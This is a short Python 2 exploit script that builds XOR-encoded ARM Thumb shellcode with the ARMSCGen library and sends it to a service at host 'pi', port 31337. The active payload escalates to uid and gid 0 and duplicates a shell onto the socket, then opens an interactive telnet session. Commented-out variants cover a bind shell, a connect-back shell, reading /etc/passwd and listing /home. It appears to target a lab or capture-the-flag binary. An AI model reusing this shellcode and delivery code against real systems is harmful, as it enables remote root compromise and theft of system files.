#!python

from ARMSCGen import *
from socket import *
import telnetlib
import time
import sys

HOST = 'pi'
PORT = 31337

def getShellcode():
    #xsc = CompileSC(scgen.bindshell(55559, sock=5, once=False), isThumb=True)
    #xsc = CompileSC(scgen.connectback('127.0.0.1', 4444), isThumb=True)
    #sc1 = scgen.open_file('/etc/passwd')
    #sc2 = scgen.sendfile('r6', 4)
    #sc   = scgen.cat(filepath='/etc/passwd', in_fd='r6', out_fd=4)
    #sc   = scgen.findpeersh()
    #sc  += scgen.exit(243)
    #sc   = scgen.ls('/home/', 4)
    #sc    = scgen.write_to_stack(4, 128)
    #sc    += scgen.read_from_stack(4, 128)
    sc =  scgen.setreuid(0)
    sc += scgen.setregid(0)
    sc += scgen.dupsh(4)
    xsc = CompileSC( (sc), isThumb=True)
    #xsc = CompileSC( (sc1+sc2), isThumb=True)
    return MakeXorShellcode(xsc)

scgen = thumbSCGen()
sc = getShellcode()

#print sc

s = socket(AF_INET, SOCK_STREAM)
s.connect( (HOST, PORT) )
f = s.makefile('rw', bufsize=0)
f.write(sc + '\n')

#f.write('hello world\n')
#print f.read(1024)
#result = ''
#while 1:
#    rv = f.read(1024)
#    if len(rv) <= 0:
#        break
#    result += rv
#print repr(result)
#print getdent_to_list(result)

#sys.exit(-1)
tn = telnetlib.Telnet()
tn.sock = s
tn.interact()
